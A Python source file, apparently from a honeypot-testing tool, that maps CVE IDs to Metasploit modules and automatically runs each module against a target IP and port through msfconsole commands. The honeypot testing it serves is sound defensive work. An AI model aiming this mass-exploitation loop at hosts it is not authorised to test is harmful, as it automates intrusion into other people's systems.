# This script finds the metasploit module for a given CVE.
# It then runs the exploit against the honeypot.
# It is required to have metasploit installed.
import time
import shutil
import logging
import subprocess
from pathlib import Path
from base_attack import BaseAttack

logging.basicConfig(level=logging.INFO)
METASPLOIT = "/opt/metasploit-framework/bin/msfconsole"
METASPLOIT_UPDATE = "/opt/metasploit-framework/bin/msfupdate"
# TODO: remove INFO:root from printing in the console
# TODO: it's very slow try using pymetasploit3

class Exploit:
    def __init__(self, cve, module):
        self.cve = cve
        self.module = module

class SoftwareExploit(BaseAttack):
    def __init__(self, honeypot):
        super().__init__(honeypot)
        self.exploits = []
        self.all_cves_path = Path(__file__).resolve().parent.parent / "passive_attacks" / "results" / "all_cves.txt"
        self.metasploit_modules_file = Path(__file__).resolve().parent.parent / "passive_attacks" / "results" / "metasploit_modules.txt"
    
    def is_msfconsole_installed(self):
        """
        Check if msfconsole is installed.
        """
        logging.info("Checking if msfconsole is installed...")
        return shutil.which(METASPLOIT) is not None

    def update_metasploit(self):
        """
        Update metasploit.
        """
        logging.info("Updating metasploit...")
        command = f"{METASPLOIT_UPDATE}"
        try:
            output = subprocess.check_output(command, shell=True).decode()
            logging.info(f"Metasploit output: {output}")
        except subprocess.CalledProcessError:
            logging.error(f"Failed to update metasploit")

    def remove_duplicates(self):
        """
        Remove duplicates from the all_cves.txt file.
        """
        logging.info("Removing duplicates from all_cves.txt...")
        lines_seen = set()
        output_lines = []
        with open(self.all_cves_path, "r") as file:
            for line in file:
                if line not in lines_seen:
                    output_lines.append(line)
                    lines_seen.add(line)     
        with open(self.all_cves_path, "w") as file:
            for line in output_lines:
                file.write(line)

    def read_from_metasploit_modules_file(self):
        """
        Read the metasploit modules from the metasploit_modules.txt file.
        """
        logging.info(f"Reading metasploit modules from {self.metasploit_modules_file}...")
        if not self.metasploit_modules_file.exists():
            logging.error(f"The file {self.metasploit_modules_file} does not exist.")
            return None
        with open(self.metasploit_modules_file, "r") as file:
            modules = file.read().splitlines()
            for module in modules:
                self.exploits.append(Exploit(None, module))

    def find_module(self, cve):
        """
        Find the metasploit module for a given CVE.
        """
        logging.info(f"Finding module for {cve}...")
        command = f"{METASPLOIT} -q -x 'search {cve}; exit'"
        try:
            output = subprocess.check_output(command, shell=True).decode()
            lines = output.split("\n")
            start_parsing = False  
            for line in lines:
                # This is the line just before the actual module lines
                if "----" in line:  
                    # Set the flag to start parsing the next lines
                    start_parsing = True  
                    # Skip the current line
                    continue  
                if start_parsing:
                    # Split the line into fields by multiple spaces
                    elements = line.split()  
                    # If the line has less than 1 field, it's not a module line
                    if len(elements) < 1:  
                        break
                    # The first element is always the index, the second element is the module name
                    module = elements[1]
                    self.exploits.append(Exploit(cve, module))
                    logging.info(f"Found module {module} for {cve}!")
                
        except subprocess.CalledProcessError:
            logging.error(f"Failed to find module for CVE {cve}")

    def get_cves_from_file(self):
        """
        Get the CVEs from the all_cves.txt file.
        """
        logging.info("Getting CVEs from all_cves.txt...")
        if not self.all_cves_path.exists():
            logging.error(f"The file {self.all_cves_path} does not exist.")
            return None
        with open(self.all_cves_path, "r") as file:
            cves = file.read().splitlines()
            for cve in cves:
                self.find_module(cve)

    def run_exploit(self, module):
        """
        Run the exploit against the honeypot.
        """
        logging.info(f"Running exploit {module} on {self.honeypot.get_ip()}:{self.honeypot.get_port()}...")
        command = f"{METASPLOIT} -q -x 'use {module}; set RHOSTS {self.honeypot.get_ip()}; set RPORT {self.honeypot.get_port()}; run; exit'"
        try:
            output = subprocess.check_output(command, shell=True).decode()
            logging.info(f"Exploit output: {output}")
        except subprocess.CalledProcessError:
            logging.error(f"Failed to run exploit {module} on {self.honeypot.get_ip()}:{self.honeypot.get_port()}")

    def run_attack(self):
        """
        Run the software exploit attack against the vulnerable software in the honeypot.
        """
        logging.info(f"Running software exploit attack on {self.honeypot.get_ip()}:{self.honeypot.get_port()}...")
        start_time = time.time()

        software_exploit = SoftwareExploit(self.honeypot)
        if software_exploit.is_msfconsole_installed():

            if input("Do you want to update metasploit? (yay/nay): ") == "yay":
                software_exploit.update_metasploit()
            
            if software_exploit.metasploit_modules_file.exists():
                if input(f"Do you want to read modules from {self.metasploit_modules_file}? (yay/nay): ") == "yay":
                    logging.info(f"Reading metasploit modules from {self.metasploit_modules_file}...")
                    software_exploit.read_from_metasploit_modules_file()  
                    for exploit in software_exploit.exploits:
                        software_exploit.run_exploit(exploit.module)
                    end_time = time.time()
                    time_taken = end_time - start_time
                    return False, "Software exploit attack successful", time_taken, "{self.metasploit_modules_file}"

            software_exploit.remove_duplicates()
            software_exploit.get_cves_from_file()

            with open(self.metasploit_modules_file, 'w') as f:
                for exploit in software_exploit.exploits:
                    f.write(f"{exploit.module}\n")
                    logging.info(f"Found module {exploit.module} for {exploit.cve}")
                    software_exploit.run_exploit(exploit.module)
            end_time = time.time()
            time_taken = end_time - start_time
            return False, "Software exploit attack successful", time_taken, self.metasploit_modules_file
        else:
            logging.error("msfconsole is not installed or not found, please set the METASPLOIT variable to point to the msfconsole binary installed in your computer.")
            end_time = time.time()
            time_taken = end_time - start_time
            return False, "msfconsole is not installed or not found, please set the METASPLOIT variable to point to the msfconsole binary installed in your computer.", time_taken, self.metasploit_modules_file
